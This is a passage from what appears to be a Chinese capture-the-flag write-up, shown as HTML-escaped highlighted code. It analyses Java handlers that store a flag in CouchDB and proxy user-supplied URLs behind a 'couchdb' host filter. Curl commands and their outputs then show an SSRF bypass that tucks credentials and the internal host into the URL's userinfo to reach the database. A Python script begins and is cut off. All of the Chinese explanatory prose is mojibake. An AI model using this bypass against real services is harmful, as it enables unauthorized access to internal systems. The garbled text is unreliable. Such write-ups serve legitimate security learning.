&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal dbname&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal username&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;/_security&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">configObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËøôÈÉ®ÂàÜÊòØÂàõÂª∫Áî®Êà∑Âπ∂ÊèíÂÖ•Êï∞ÊçÆÂ∫ì‰∏≠ Âπ∂‰∏îÊèíÂÖ•‰∏Ä‰∏™Êñá‰ª∂ÔºåÊ¨∏ Áî®ÁöÑ‰πüÊòØhttpÂèëËØ∑Ê±ÇËøô‰∏ÄÊãõ Ëøô‰∏çÂ∞±ÂèØÊéß‰∫ÜÔºü&lt;/p>
&lt;p>ËøôÈáåÂ∞±ÂÆå‰∫ÜÔºåËΩ¨ÂéªÁúãHandlers.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">Main&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertDocumentToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">flagDoc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂΩìÂèëÂá∫‰∏Ä‰∏™ËØ∑Ê±Ç Â∏¶ÁùÄusernameÂíåpasswdÊó∂ÔºåÂÆÉ‰ºöË∞ÉÁî®&lt;code>createUser()&lt;/code>ÂàõÂª∫‰∏ÄÊù°Áî®Êà∑ÁöÑÊï∞ÊçÆÂ≠òÂÖ•Â∫ì‰∏≠ÔºåÂπ∂‰∏îÂ≠ò‰∏Ä‰∏™flagDocÔºõÊé•ÁùÄÁúãÊúÄÂêé‰∏Ä‰∏™testAPI&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">testAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;method&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">queryParam&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">urlURI&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">urlURI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHost&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">contains&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;couchdb&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">MalformedURLException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input URL is malformed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">postAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">stringJsonObj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jsonObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsFlag&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stringJsonObj&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ForbiddenResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal!&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BadRequestResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Request method is not accepted&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InternalServerErrorResponse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;success&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂØπÁªôÂá∫ÁöÑurlÔºàÈÄöËøáurlÂèÇÊï∞ËøõË°åÊèê‰∫§ÔºâËøõË°ågetÊàñËÄÖpostÔºåÂÖàÊ£ÄÊü•&lt;code>if (urlURI.getHost().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>ÔºåÂ¶ÇÊûú‰∏∫ÁúüÁõ¥Êé•Êä•ÈîôÔºõ‰πãÂêéÂèëÂá∫ËØ∑Ê±Ç Â¶ÇÊûú&lt;code>Utils.containsFlag(stringJsonObj)&lt;/code>‰∏∫Áúü‰πü‰ºöÊä•ÈîôÂá∫Âéª&lt;/p>
&lt;p>Ê∫êÁ†ÅÁÆóÊòØÁúãÂÆå‰∫ÜÔºåÊé•‰∏ãÊù•ÊÉ≥ÊÉ≥Ëß£È¢òÁöÑÊñπÊ≥ïÔºàÊúâÈÉ®ÂàÜÂÖ≥‰∫éssrfÁöÑÂâçÁΩÆÁü•ËØÜÂèØ‰ª•ÁúãËøôÁØáÈºªÁ•ñppt - &lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - üçäOrange Tsai&lt;/a>Ôºâ&lt;/p>
&lt;p>Êú¨Âú∞ÂÖàËµ∑‰∏Ä‰∏™ÁéØÂ¢ÉÔºårun on localhost:8080Ôºå&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl localhost:8080/testAPI?url&lt;span style="color:#f92672">=&lt;/span>https://couchdb:5984/&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>GET
Illegal!
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Áî±‰πãÂâçÁöÑ‰ª£Á†ÅÂàÜÊûêÊàë‰ª¨Áü•ÈÅìÂõ†‰∏∫couchdbÁöÑÂ≠òÂú®ÊâÄ‰ª•illegalÔºå‰ΩÜÊòØ‰∏çÂ§™ÈáçË¶ÅÔºàÂèçÊ≠£Áªà‰ºöË¢´ÁªïËøáÔºâÂÖàÂàõÂª∫‰∏Ä‰∏™Áî®Êà∑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl http://localhost:8080/createUser?username&lt;span style="color:#f92672">=&lt;/span>neptunian&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>neptunian
&lt;span style="color:#75715e"># Creating user&lt;/span>
success
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Listing &amp;#34;neptunian&amp;#34; database documents, using our credentials (jq formats our JSON output)&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#75715e"># Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{fake}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊòæÁÑ∂ÂΩìÊàë‰ª¨Êñ∞Âª∫‰∏Ä‰∏™Áî®Êà∑Êó∂ÔºåÊàë‰ª¨ÁöÑfake flag‰ºöË¢´Ëá™Âä®ÊèíÂÖ•Ëøô‰∏™Êï∞ÊçÆÂ∫ì‰∏≠ÔºåÂπ∂‰∏îÁõ¥Êé•curlÊòØÂèØ‰ª•ÂèñÂá∫Êù•ÁöÑÔºå‰ΩÜÊòØÈ¢òÁõÆÊòØ‰∏çËÉΩÁõ¥Êé•curl ÈúÄË¶ÅÁºùÂêàÂà∞ÈôêÂÆöÁöÑtestAPI‰∏äÔºåÂ∞ùËØïÊûÑÈÄ†‰∏Ä‰∏ã~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -vv http://localhost:8080/testAPI?method&lt;span style="color:#f92672">=&lt;/span>GET&lt;span style="color:#8045ff">\&amp;amp;&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>http://neptunian:neptunian&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984&lt;span style="color:#8045ff">\@&lt;/span>couchdb&lt;span style="color:#8045ff">\:&lt;/span>5984/neptunian
...
success
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËøôÊ†∑ÊûÑÈÄ†ÁöÑurlÂπ∂‰∏ç‰ºöËß¶ÂèëfilterÔºå‰ΩÜÊòØÁî±‰∫é‰ªÖ‰ªÖËøîÂõûsuccessËÄåÊ≤°ÊúâÊõ¥Â§öÁöÑ‰ø°ÊÅØÔºå‰∏∫‰∫ÜÈ™åËØÅÊòØ‰∏çÊòØËß¶ÂèäÂà∞‰∫Ücouchdb serverÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïÊèíÂÖ•‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑdocÔºåËøôÈáåÁî®pyËÑöÊú¨‰º†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># Simple POST Test&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
